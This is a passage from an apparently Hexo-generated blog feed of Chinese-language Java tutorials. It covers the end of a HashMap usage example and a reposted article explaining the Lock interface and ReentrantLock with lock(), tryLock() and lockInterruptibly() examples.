class="built_in">get</span>(<span class="built_in">key</span>);</div><div class="line">            System.out.<span class="built_in">println</span>(<span class="built_in">key</span>+<span class="string">" -- "</span>+integ.intValue());</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="comment">/*</span></div><div class="line"><span class="comment">     * 遍历HashMap的values</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> iteratorHashMapJustValues(<span class="keyword">HashMap</span> <span class="built_in">map</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">return</span> ;</div><div class="line">        </div><div class="line">        Collection c = <span class="built_in">map</span>.values();</div><div class="line">        Iterator iter= c.iterator();</div><div class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</div><div class="line">            System.out.<span class="built_in">println</span>(iter.next());</div><div class="line">       &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div></p>
<h2 id="HashMap示例"><a href="#HashMap示例" class="headerlink" title="HashMap示例"></a>HashMap示例</h2><p>下面通过一个实例学习如何使用<code>HashMap</code>。<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"><span class="keyword">import</span> java.util.Random;</div><div class="line"><span class="keyword">import</span> java.util.Iterator;</div><div class="line"><span class="keyword">import</span> java.util.HashMap;</div><div class="line"><span class="keyword">import</span> java.util.HashSet;</div><div class="line"><span class="keyword">import</span> java.util.Map.Entry;</div><div class="line"><span class="keyword">import</span> java.util.Collection;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * @desc HashMap测试程序</span></div><div class="line"><span class="comment"> *        </span></div><div class="line"><span class="comment"> * @author skywang</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> class HashMapTest &#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</div><div class="line">        testHashMapAPIs();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> testHashMapAPIs() &#123;</div><div class="line">        <span class="comment">// 初始化随机种子</span></div><div class="line">        Random r = <span class="keyword">new</span> Random();</div><div class="line">        <span class="comment">// 新建HashMap</span></div><div class="line">        HashMap <span class="built_in">map</span> = <span class="keyword">new</span> HashMap();</div><div class="line">        <span class="comment">// 添加操作</span></div><div class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"one"</span>, r.nextInt(<span class="number">10</span>));</div><div class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"two"</span>, r.nextInt(<span class="number">10</span>));</div><div class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"three"</span>, r.nextInt(<span class="number">10</span>));</div><div class="line"></div><div class="line">        <span class="comment">// 打印出map</span></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"map:"</span>+<span class="built_in">map</span> );</div><div class="line"></div><div class="line">        <span class="comment">// 通过Iterator遍历key-value</span></div><div class="line">        Iterator iter = <span class="built_in">map</span>.entrySet().iterator();</div><div class="line">        <span class="built_in">while</span>(iter.hasNext()) &#123;</div><div class="line">            Map.Entry entry = (Map.Entry)iter.next();</div><div class="line">            System.out.<span class="built_in">println</span>(<span class="string">"next : "</span>+ entry.<span class="built_in">getKey</span>() +<span class="string">" - "</span>+entry.getValue());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">// HashMap的键值对个数        </span></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"size:"</span>+<span class="built_in">map</span>.<span class="built_in">size</span>());</div><div class="line"></div><div class="line">        <span class="comment">// containsKey(Object key) :是否包含键key</span></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"contains key two : "</span>+<span class="built_in">map</span>.containsKey(<span class="string">"two"</span>));</div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"contains key five : "</span>+<span class="built_in">map</span>.containsKey(<span class="string">"five"</span>));</div><div class="line"></div><div class="line">        <span class="comment">// containsValue(Object value) :是否包含值value</span></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"contains value 0 : "</span>+<span class="built_in">map</span>.containsValue(<span class="keyword">new</span> Integer(<span class="number">0</span>)));</div><div class="line"></div><div class="line">        <span class="comment">// remove(Object key) ： 删除键key对应的键值对</span></div><div class="line">        <span class="built_in">map</span>.<span class="built_in">remove</span>(<span class="string">"three"</span>);</div><div class="line"></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="string">"map:"</span>+<span class="built_in">map</span> );</div><div class="line"></div><div class="line">        <span class="comment">// clear() ： 清空HashMap</span></div><div class="line">        <span class="built_in">map</span>.<span class="built_in">clear</span>();</div><div class="line"></div><div class="line">        <span class="comment">// isEmpty() : HashMap是否为空</span></div><div class="line">        System.out.<span class="built_in">println</span>((<span class="built_in">map</span>.isEmpty()?<span class="string">"map is empty"</span>:<span class="string">"map is not empty"</span>) );</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div><br>运行结果如下：<br><img src="https://github.com/sunstady/hexo/blob/master/HashMap/2.jpg?raw=true" alt="last"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;哈希表(hash table)也叫散列表，是一种非常重要的数据结构，应用场景及其丰富，许多缓存技术(比如memcached)的核心其实就是在内存中维护一张答的哈希表，而HahsMap的实现原理也常常出现在各类的面试题中，重要性可见一斑。&lt;br&gt;
    
    </summary>
    
    
      <category term="Interview" scheme="http://www.sanstylemc.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Lock</title>
    <link href="http://www.sanstylemc.cn/2018/07/31/Lock/"/>
    <id>http://www.sanstylemc.cn/2018/07/31/Lock/</id>
    <published>2018-07-31T03:16:29.000Z</published>
    <updated>2018-07-31T03:19:27.052Z</updated>
    
    <content type="html"><![CDATA[<p>RT, 继上一篇。<br>&nbsp;&nbsp;&nbsp;&nbsp;从Java 5之后，在<code>java.util.concurrent.locks</code>包下提供了另外一种方式来实现同步访问，那就是Lock。<br><a id="more"></a><br>转自<a href="http://www.cnblogs.com/dolphin0520/p/3923167.html" target="_blank" rel="external">此处</a>。</p>
<h2 id="synchronized的缺陷"><a href="#synchronized的缺陷" class="headerlink" title="synchronized的缺陷"></a>synchronized的缺陷</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;<code>synchronized</code>是Java中的一个关键字，也就是说是Java语言内置的特性。那么为什么会出现<code>Lock</code>呢?<br>&nbsp;&nbsp;&nbsp;&nbsp;在上一篇文章中，我们了解到如果一个代码块被<code>synchronized</code>修饰了，当一个线程获取了对应的锁，并执行该代码块时，其他线程便只能一直等待，等待获取锁的线程释放锁，而这里获取锁的线程释放锁只会有两种情况：<br>1) 获取锁的线程执行完了该代码块，然后线程释放对锁的占有；<br>2) 线程执行发生异常，此时JVM会让线程自动释放锁。<br>&nbsp;&nbsp;&nbsp;&nbsp;那么如果这个获取锁的线程由于要等待IO或者其他原因(比如调用sleep方法)被阻塞了，但是有没有释放锁，其他线程便只能干巴巴地等待，试想一下，这多么影响程序执行效率。<br>&nbsp;&nbsp;&nbsp;&nbsp;因此需要有一种机制可以不让等待的线程一直无期限地等待下去(比如只等待一定的时间或者能够响应中断)，通过<code>Lock</code>就可以办到。<br>&nbsp;&nbsp;&nbsp;&nbsp;再举个例子：当有多个线程读写文件时，读操作和写操作会发生冲突现象，写操作和写操作会发生冲突现象，但是读操作和读操作不会发生冲突现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;但是采用<code>synchronized</code>关键字来实现同步的话，就会导致一个问题：<br>如果多个线程都只是进行读操作，所以当一个线程在进行读操作时，其他线程只能等待无法进行读操作。<br>&nbsp;&nbsp;&nbsp;&nbsp;因此就需要一种机制来使得多个线程都只是进行读操作时，线程之间不会发生冲突，通过Lock就可以办到。<br>&nbsp;&nbsp;&nbsp;&nbsp;另外，通过<code>Lock</code>可以知道线程有没有成功获取到锁。这个是<code>synchronized</code>无法办到的。<br>&nbsp;&nbsp;&nbsp;&nbsp;总结一下，也就是说<code>Lock</code>提供了<code>synchronized</code>更多的功能。但是要注意以下几点：<br>1) <code>Lock</code>不是Java语言内置的，<code>synchronized</code>是Java语言的关键字，因此是内置特性。Lock是一个类，通过这个类可以实现同步访问；<br>2) <code>Lock</code>和<code>synchronized</code>有一点非常大的不同，采用<code>synchronized</code>不需要用户去手动释放锁，当<code>synchronized</code>方法或者<code>synchronized</code>代码块执行完之后，系统会自动让线程释放对锁的占用；而<code>Lock</code>则必须要用户去手动释放锁，如果没有主动释放锁，就有可能导致出现<code>死锁</code>现象。</p>
<h2 id="java-util-concurrent-locks包下常用的类"><a href="#java-util-concurrent-locks包下常用的类" class="headerlink" title="java.util.concurrent.locks包下常用的类"></a>java.util.concurrent.locks包下常用的类</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;下面我们就来探讨一下<code>java.util.concurrent.locks</code>包中常用的类和接口</p>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;首先要说明的就是Lock, 通过查看Lock的源码可知，Lock是一个接口：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Lock</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span>;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>;</div><div class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">()</span></span>;</div><div class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException</span>;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span></span>;</div><div class="line">    <span class="function">Condition <span class="title">newCondition</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;下面来逐个讲述<code>Lock</code>接口中每个方法的使用，<code>lock()</code>、<code>tryLock()</code>、<code>tryLock(long time, TimeUnit unit)</code>和<code>lockInterruptibly()</code>是用来获取锁的。<code>unLock()</code>方法是用来释放锁的。<br>&nbsp;&nbsp;&nbsp;&nbsp;在<code>Lock()</code>中声明了四个方法来获取锁，那么这四个方法有何区别呢？<br>首先<code>lock()</code>方法是平常使用得最多的一个方法，就是用来获取锁。如果锁已被其他线程获取，则进行等待。<br>&nbsp;&nbsp;&nbsp;&nbsp;由于在前面讲到如果采用<code>Lock</code>，必须主动去释放锁，并且在发生异常时，不会自动释放锁。因此一般来说，使用<code>lock</code>必须在<code>try{}catch{}</code>块中进行，并且将释放锁的操作放在<code>finally</code>块中进行，以保证锁一定被释放，防止死锁的发生。通常使用<code>Lock</code>来进行同步的话，是以下面这种形式去使用的：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Lock <span class="keyword">lock</span> = ...;</div><div class="line"><span class="keyword">lock</span>.<span class="keyword">lock</span>();</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">    <span class="comment">//处理任务</span></div><div class="line">&#125;<span class="keyword">catch</span>(Exception ex)&#123;</div><div class="line">     </div><div class="line">&#125;<span class="keyword">finally</span>&#123;</div><div class="line">    <span class="keyword">lock</span>.unlock();   <span class="comment">//释放锁</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>tryLock()</code>方法是有返回值的，它表示用来尝试获取锁，如果获取成功，则返回<code>true</code>，如果获取失败(即锁已被其他线程获取)，则返回<code>false</code>，也就是说这个方法无论如何都会立即返回。在拿不到锁时不会一直在那等待。<br>&nbsp;&nbsp;&nbsp;&nbsp;<code>tryLock(long time, TimeUnit unit)</code>方法和<code>tryLock()</code>方法是类似的，只不过区别在于这个方法在拿不到锁时会等待一定的时间，在时间期限之内如果还拿不到锁，就返回false。如果一开始拿到锁或者在等待期间内拿到了锁，则返回true。<br>&nbsp;&nbsp;&nbsp;&nbsp;所以，一般情况下通过<code>tryLock()</code>来获取锁时是这样使用的：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Lock <span class="keyword">lock</span> = ...;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">lock</span>.tryLock()) &#123;</div><div class="line">     <span class="keyword">try</span>&#123;</div><div class="line">         <span class="comment">//处理任务</span></div><div class="line">     &#125;<span class="keyword">catch</span>(Exception ex)&#123;</div><div class="line">         </div><div class="line">     &#125;<span class="keyword">finally</span>&#123;</div><div class="line">         <span class="keyword">lock</span>.unlock();   <span class="comment">//释放锁</span></div><div class="line">     &#125; </div><div class="line">&#125;<span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">//如果不能获取锁，则直接做其他事情</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>lockInterruptibly()</code>方法比较特殊，当通过这个方法去获取锁时，如果线程正在等待获取锁，则这个线程能够响应中断，即中断线程的等待状态。也就是说，当两个线程同时通过<code>lock.lockInterruptibly()</code>想获取某个锁时，假若此时线程A获取到了锁，而线程B只有在等待，那么对线程B调用<code>threadB.interrupt()</code>方法能够中断线程B的等待过程。<br>&nbsp;&nbsp;&nbsp;&nbsp;由于<code>lockInterruptibly()</code>的声明中抛出了异常，所以<code>lock.lockInterruptibly()</code>必须放在<code>try</code>块中或者调用<code>lockInterruptibly()</code>的方法外声明抛出<code>InterruptedException</code>。<br>因此<code>lockInterruptibly()</code>一般的使用形式如下：<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> void <span class="function"><span class="keyword">method</span><span class="params">()</span> <span class="title">throws</span> <span class="title">InterruptedException</span> <span class="comment">&#123;</span></span></div><div class="line"><span class="function"><span class="comment">    lock.lockInterruptibly();</span></span></div><div class="line"><span class="function"><span class="comment">    try &#123;  </span></span></div><div class="line"><span class="function"><span class="comment">     //.....</span></span></div><div class="line"><span class="function"><span class="comment">    &#125;</span></span></div><div class="line"><span class="function">    <span class="title">finally</span> <span class="comment">&#123;</span></span></div><div class="line"><span class="function"><span class="comment">        lock.unlock();</span></span></div><div class="line"><span class="function"><span class="comment">    &#125;</span>  </span></div><div class="line"><span class="function">&#125;</span></div></pre></td></tr></table></figure></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;注意，当一个线程获取了锁之后，是不会被<code>interrupt()</code>方法中断的。因为本身单独调用<code>interrupt()</code>方法不能中断正在运行过程中的线程，只能中断阻塞过程中的线程。<br>&nbsp;&nbsp;&nbsp;&nbsp;因此当通过<code>lockInterruptibly()</code>方法获取某个锁时，如果不能获取到，只有进行等待的情况下，是可以响应中断的。<br>&nbsp;&nbsp;&nbsp;&nbsp;而用<code>synchronized</code>修饰的话，当一个线程处于等待某个锁的状态，是无法被中断的，只有一直等待下去。</p>
<h3 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;意思是”可重入锁”。<code>ReentrantLock</code>是唯一实现了<code>Lock</code>接口的类，并且<code>ReentrantLock</code>提供了更多的方法，下面通过一些实例来具体看一下如何使用<code>ReentrantLock</code>。<br>例子1，<code>lock()</code>的正确使用方法：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)  </span>&#123;</div><div class="line">        final Test test = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>) </span>&#123;</div><div class="line">        Lock <span class="keyword">lock</span> = <span class="keyword">new</span> ReentrantLock();    <span class="comment">//注意这个地方</span></div><div class="line">        <span class="keyword">lock</span>.<span class="keyword">lock</span>();</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"得到了锁"</span>);</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</div><div class="line">                arrayList.<span class="keyword">add</span>(i);</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></div><div class="line">        &#125;<span class="keyword">finally</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"释放了锁"</span>);</div><div class="line">            <span class="keyword">lock</span>.unlock();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出结果为：<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/1.jpg?raw=true" alt="1"><br>&nbsp;&nbsp;&nbsp;&nbsp;也许有朋友会问，怎么会输出这个结果？第二个线程怎么会在第一个线程释放锁之前得到了锁？原因在于，在<code>insert</code>方法中的<code>lock</code>变量是局部变量，每个线程执行该方法时都会保存一个副本，那么理所当然每个线程执行到<code>lock.lock()</code>处获取的是不同的锁，所以就不会发生冲突。<br>知道了原因改起来就比较容易了，只需要将<code>lock</code>声明改为类的属性即可。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line">    <span class="keyword">private</span> Lock <span class="keyword">lock</span> = <span class="keyword">new</span> ReentrantLock();    <span class="comment">//注意这个地方</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)  </span>&#123;</div><div class="line">        final Test test = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>) </span>&#123;</div><div class="line">        <span class="keyword">lock</span>.<span class="keyword">lock</span>();</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"得到了锁"</span>);</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</div><div class="line">                arrayList.<span class="keyword">add</span>(i);</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></div><div class="line">        &#125;<span class="keyword">finally</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"释放了锁"</span>);</div><div class="line">            <span class="keyword">lock</span>.unlock();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出结果如下：<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/2.jpg?raw=true" alt="2"><br>这样就是正确地使用<code>Lock</code>的方法了。</p>
<p>例子2，<code>tryLock()</code>的使用方法<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</div><div class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</div><div class="line">    <span class="keyword">private</span> Lock <span class="keyword">lock</span> = <span class="keyword">new</span> ReentrantLock();    <span class="comment">//注意这个地方</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)  </span>&#123;</div><div class="line">        final Test test = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line"></div><div class="line">        <span class="keyword">new</span> Thread()&#123;</div><div class="line">            @Override</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                test.insert(Thread.currentThread());</div><div class="line">            &#125;;</div><div class="line">        &#125;.start();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span>(<span class="params">Thread thread</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">lock</span>.tryLock()) &#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"得到了锁"</span>);</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</div><div class="line">                    arrayList.<span class="keyword">add</span>(i);</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">                <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></div><div class="line">            &#125;<span class="keyword">finally</span> &#123;</div><div class="line">                System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"释放了锁"</span>);</div><div class="line">                <span class="keyword">lock</span>.unlock();</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            System.<span class="keyword">out</span>.println(thread.getName()+<span class="string">"获取锁失败"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出结果如下：<br><img src="https://github.com/sunstady/hexo/blob/master/Lock/3.jpg?raw=true" alt="3"></p>
<p>例子3，<code>lockInterruptibly()</code>响应中断的使用方法。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</div><div class="line">    <span class="keyword">private</span> Lock <span class="keyword">lock</span> = <span class="keyword">new</span> ReentrantLock();</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)  </span>&#123;</div><div class="line">        Test test = <span class="keyword">new</span> Test();</div><div class="line">        MyThread thread1 = <span class="keyword">new</span> MyThread(test);</div><div 